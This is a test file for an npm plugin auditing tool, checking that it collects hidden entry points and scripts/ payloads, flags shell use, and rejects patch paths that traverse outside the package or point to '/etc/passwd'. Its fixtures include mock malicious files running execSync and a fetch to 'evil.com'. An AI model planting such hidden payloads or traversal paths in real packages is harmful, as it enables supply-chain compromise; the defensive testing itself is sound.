import { mkdirSync, writeFileSync, rmSync, mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { auditPlugin } from '../../src/core/audit.ts'
import { collectPlugin, manifestEntryPaths } from '../../src/fs.ts'

describe('collectPlugin', () => {
  it('reads manifest main even when lib/ exists', () => {
    const root = mkdtempSync(join(tmpdir(), 'trust-fs-'))
    try {
      mkdirSync(join(root, 'lib'))
      writeFileSync(join(root, 'package.json'), JSON.stringify({
        name: 'dummy-lib-evil',
        version: '1.0.0',
        main: './evil.js',
      }))
      writeFileSync(join(root, 'lib', 'index.js'), 'export function apply() {}\n')
      writeFileSync(join(root, 'evil.js'), "import { execSync } from 'node:child_process'\nexecSync('id')\n")
      const collected = collectPlugin(root, 'npm:dummy-lib-evil@1.0.0')
      const report = auditPlugin(collected)
      expect(Object.keys(collected.sources).sort()).toEqual(['evil.js', 'lib/index.js'])
      expect(report.capabilities).toContain('shell')
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('stores source keys with forward slashes on every platform', () => {
    const root = mkdtempSync(join(tmpdir(), 'trust-fs-'))
    try {
      mkdirSync(join(root, 'lib'))
      writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'slash-keys', version: '1' }))
      writeFileSync(join(root, 'lib', 'index.js'), 'export const x = 1\n')
      const collected = collectPlugin(root, 'npm:x@1')
      for (const key of Object.keys(collected.sources)) {
        expect(key.includes('\\')).toBe(false)
      }
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('scans scripts/ payloads referenced from lib/', () => {
    const root = mkdtempSync(join(tmpdir(), 'trust-fs-'))
    try {
      mkdirSync(join(root, 'lib'))
      mkdirSync(join(root, 'scripts'))
      writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'scripts-hide', version: '1' }))
      writeFileSync(join(root, 'lib', 'index.js'), "import { run } from '../scripts/payload.js'\nrun()\n")
      writeFileSync(join(root, 'scripts', 'payload.js'), "import { execSync } from 'node:child_process'\nexport const run = () => execSync('id')\n")
      const collected = collectPlugin(root, 'npm:x@1')
      const report = auditPlugin(collected)
      expect(Object.keys(collected.sources).sort()).toEqual(['lib/index.js', 'scripts/payload.js'])
      expect(report.capabilities).toContain('shell')
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('scans .tsx sources when no compiled lib/ exists', () => {
    const root = mkdtempSync(join(tmpdir(), 'trust-fs-'))
    try {
      mkdirSync(join(root, 'src'))
      writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'tsx-only', version: '1' }))
      writeFileSync(join(root, 'src', 'client.tsx'), "await fetch('https://evil.com')\n")
      const collected = collectPlugin(root, 'npm:x@1')
      expect(Object.keys(collected.sources)).toEqual(['src/client.tsx'])
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects patch paths outside the package directory', () => {
    const root = mkdtempSync(join(tmpdir(), 'trust-fs-'))
    try {
      mkdirSync(join(root, 'pkg'))
      writeFileSync(join(root, 'outside.yml'), '- override:\n    - id: "@deepseek-ai/dsh-base"\n')
      writeFileSync(join(root, 'pkg', 'package.json'), JSON.stringify({
        name: 'patch-trav',
        version: '1',
        dsh: { bundle: { patch: '../outside.yml' } },
      }))
      const collected = collectPlugin(join(root, 'pkg'), 'npm:x@1')
      expect(collected.patchText).toBeUndefined()
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects absolute patch paths', () => {
    const root = mkdtempSync(join(tmpdir(), 'trust-fs-'))
    try {
      writeFileSync(join(root, 'package.json'), JSON.stringify({
        name: 'patch-abs',
        version: '1',
        dsh: { bundle: { patch: '/etc/passwd' } },
      }))
      const collected = collectPlugin(root, 'npm:x@1')
      expect(collected.patchText).toBeUndefined()
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('skips patch files larger than MAX_FILE_BYTES', () => {
    const root = mkdtempSync(join(tmpdir(), 'trust-fs-'))
    try {
      writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'patch-huge', version: '1' }))
      writeFileSync(join(root, 'cordis.patch.yml'), 'x'.repeat(512 * 1024 + 1))
      const collected = collectPlugin(root, 'npm:x@1')
      expect(collected.patchText).toBeUndefined()
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })
})

describe('manifestEntryPaths', () => {
  it('collects main, bin, and export subpaths', () => {
    expect(manifestEntryPaths({
      main: './lib/index.js',
      bin: { cli: './bin/cli.js' },
      exports: {
        '.': { import: './lib/index.js', default: './lib/index.js' },
        './client': './lib/client.js',
      },
    }).sort()).toEqual(['./bin/cli.js', './lib/client.js', './lib/index.js'])
  })
})
